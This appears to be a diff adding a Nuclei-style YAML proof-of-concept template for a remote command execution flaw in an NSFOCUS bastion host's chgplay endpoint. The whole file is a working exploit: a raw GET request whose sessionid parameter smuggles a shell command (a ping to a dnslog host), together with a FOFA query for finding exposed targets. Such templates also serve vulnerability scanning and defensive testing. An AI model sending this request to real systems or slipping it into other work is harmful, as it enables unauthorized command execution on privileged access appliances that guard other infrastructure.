@@ -1,0 +1,33 @@
+id: poc-zt3aa1721cnodnnt
+info:
+  name: 绿盟堡垒机 chgplay 远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zt3aa1721cnodnnt'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zt3aa1721cnodnnt
+    fofa: body="/guomi_USBkey.php" && body="堡垒机"
+http:
+- raw:
+  - 'GET /webconf/log/chgplay?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&status=charset&speed=10&sessionid=%3Bping%20www.dnslog.com%3B HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: en-US;q=0.9,en;q=0.8
+
+    Cache-Control: max-age=0
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
